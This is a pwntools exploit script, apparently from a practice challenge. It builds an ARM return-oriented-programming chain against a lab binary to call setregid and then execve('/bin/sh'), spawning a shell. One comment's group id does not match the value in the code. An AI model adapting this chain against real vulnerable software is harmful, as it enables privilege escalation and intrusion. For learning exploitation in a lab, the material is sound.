#!/usr/bin/env python3
#!/usr/bin/env python3
import struct

from pwn import *
from pwn import asm, context, gdb, p8, p16, p32, process

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "arm"
context.bits = "32"

# 1. setregid(1020, 1020)
# 2. execve("/bin/sh", 0, 0)
io = process(["./8-rop0-arm"])
io.recv()
# 0x00010388: pop {r3, pc};
rop3 = 0x00010388
# 0x00010638: mov r2, sb; mov r1, r8; mov r0, r7; blx r3;
mov = 0x00010638
# 0x00010650: pop {r4, r5, r6, r7, r8, sb, sl, pc};
rop4 = 0x00010650
# setregid
setregid = 0x000103F4
gid = 20007
# execve
execve = 0x000103DC
binsh = 0x106EE
offset = 132
JUNK = 0x4B4E554A

# pad
payload = b""
payload += p8(0x61) * offset
# 1. setregid(1020, 1020)
payload += struct.pack("I", rop3)
payload += struct.pack("I", setregid)  # r3
payload += struct.pack("I", rop4)
payload += struct.pack("I", JUNK)  # r4
payload += struct.pack("I", JUNK)  # r5
payload += struct.pack("I", JUNK)  # r6
payload += struct.pack("I", gid)  # r7 -> r0
payload += struct.pack("I", gid)  # r8 -> r1
payload += struct.pack("I", JUNK)  # sb -> r2
payload += struct.pack("I", JUNK)  # sl
payload += struct.pack("I", mov)  # pc
# 2. execve("/bin/sh", 0, 0)
payload += struct.pack("I", JUNK)  # r4
payload += struct.pack("I", JUNK)  # r5
payload += struct.pack("I", JUNK)  # r6
payload += struct.pack("I", binsh)  # r7 -> r0
payload += struct.pack("I", 0)  # r8 -> r1
payload += struct.pack("I", 0)  # sb -> r2
payload += struct.pack("I", JUNK)  # sl
payload += struct.pack("I", rop3)  # pc
payload += struct.pack("I", execve)  # r3
payload += struct.pack("I", mov)  # pc
with open("stdin.bin", "wb") as f:
    f.write(payload)
io.sendline(payload)
io.interactive()
